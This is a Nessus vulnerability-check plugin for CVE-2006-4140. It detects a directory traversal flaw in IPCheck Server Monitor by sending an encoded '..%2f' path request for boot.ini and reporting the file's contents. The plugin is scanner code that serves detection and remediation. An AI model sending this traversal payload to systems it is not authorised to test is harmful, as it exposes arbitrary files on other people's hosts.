#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(22205);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-4140");
  script_bugtraq_id(19473);
  script_xref(name:"OSVDB", value:"27912");

  script_name(english:"IPCheck Server Monitor Traversal Arbitrary File Access");
  script_summary(english:"Checks for directory traversal vulnerability in IPCheck Server Monitor");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to a directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running IPCheck Server Monitor, a network resource
monitoring tool for Windows. 

The installed version of IPCheck Server Monitor fails to filter
directory traversal sequences from requests that pass through web
server interface.  An attacker can exploit this issue to read
arbitrary files on the remote host subject to the privileges under
which the affected application runs." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/442822/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.paessler.com/ipcheck/history" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/444227/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to IPCheck Server Monitor version 5.3.3.639/640 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
 script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);


# Make sure it's IPCheck Server Monitor.
banner = get_http_banner(port:port);
if (!banner || "Server: IPCheck/" >!< banner) exit(0);


# Try to exploit the issue to read a local file.
file = "boot.ini";
r = http_send_recv3(method:"GET", item:string("/images%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f", file), port:port,
  add_headers: make_array("Host", get_host_ip()));
if (isnull(r)) exit(0);
res = r[2];

# There's a problem if looks like boot.ini.
if ("[boot loader]">< res) {
  report = string(
    "\n",
    "Here are the contents of the file '\\boot.ini' that Nessus was\n",
    "able to read from the remote host :\n",
    "\n",
    res
  );
  security_warning(port:port, extra:report);
}
